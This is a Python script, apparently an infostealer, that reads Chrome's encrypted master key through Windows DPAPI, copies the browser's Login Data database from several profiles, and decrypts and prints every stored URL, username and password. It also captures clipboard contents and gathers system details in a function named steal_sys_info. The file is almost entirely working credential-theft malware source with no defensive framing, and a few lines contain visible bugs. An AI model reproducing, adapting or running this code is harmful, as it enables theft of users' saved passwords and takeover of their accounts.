import os
import json
import base64
from win32crypt import CryptUnprotectData
import shutil
import sqlite3
from Crypto.Cipher import AES 
import pyperclip
import platform
import socket
import re
import uuid
import requests



def get_decryption_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'],'AppData','Local','Google','Chrome','User Data','Local State')
        with open(local_state_path,'r',encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        return CryptUnprotectData(encrypted_key,None,None,None,0)[1]
    except Exception as e:
        print(f"Error : {e}")
        return None


def decrypt_password(password,key):
    try:
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            enc_pass = password[15:-16]
            cipher = AES.new(key,AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(enc_pass)
            return decrypted_password.decode()
        else:
            return CryptUnprotectData(password,None,None,None,0)[1].decode()
    except Exception as e:
        print(f"Error : {e}")
        return None

 

def extract_browser_passwords():
    key = get_decryption_key()
    if not key:
        return []
    credentials = []
    profiles = ['Default','Profile 1','Profile 2','Profile 3','Profile 4']
    base_path = os.path.join(os.environ['USERPROFILE'],r'AppData\Local\Google\Chrome\User Data')
    for profile in profiles:
        login_db_path = os.path.join(base_path,profile,'Login Data')
        if os.path.exists(login_db_path):
            try:
                shutil.copy2(login_db_path,'Login Data.db')
                conn = sqlite3.connect('Login Data.db')
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value From logins')
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username= row[1]
                    encrypted_password= row[2]
                    decrypted_password = decrypt_password(encrypted_password,key)
                    if decrypted_password:
                        credentials.append({
                            'profile':profile,
                            'url':origin_url,
                            'username':username,
                            'password':decrypted_password    
                        })
                cursor.close()
                conn.close()
            except Exception as e:
                print(f"Error : {e}")
            finally:
                if os.path.exists('Login Data.db'):
                    os.remove('Login Data.db')
    return credentials

def capture_clipboard():
    try:
        clip = pyperclip.paste()
        return clip
    except Exception as e:
        print(f'Erro : {e}')


def steal_sys_info():
    try:
        info = {
            'platform':platform.system(),
            'platform_release':platform.release(),
            'platform_version':platform.version(),
            'architecture':platform.machine(),
            'hostname':socket.gethostbyname(),
            'ip_address':socket.gethostbyname(socket.gethostbyname()),
            'mac_address':':'.join(re.findall('..','%012x' % uuid.getnode())),
            'processor':platform.processor()
        }
        try:
            response = requests.get('https://api.ipify.org?format=json')
            global_ip = response.json().get('ip','N/A')
            info['global_ip'] = global_ip
        except Exception as e:
            print(f'Error : {e}')
            info['global_ip'] = "couldnt fetch"
        return info
    except Exception as e:
        print(f"Error : {e}")
    
if __name__ == "__main__":
    passwords = extract_browser_passwords()
    print("extracted browwser passwords:")
    for cred in passwords:
        print(f"Profile : {cred['profile']}\nURL : {cred['url']}\nUsername : {cred['username']}\npasswords : {cred['password']}\n'-'*40")
    clip = capture_clipboard()
    if clip:
        print("\nClipboard Content :\n",clip)
    sys_info = steal_sys_info()
    if sys_info:
        for key,value in sys_info.items():
            print(f'{key}:{value}')
        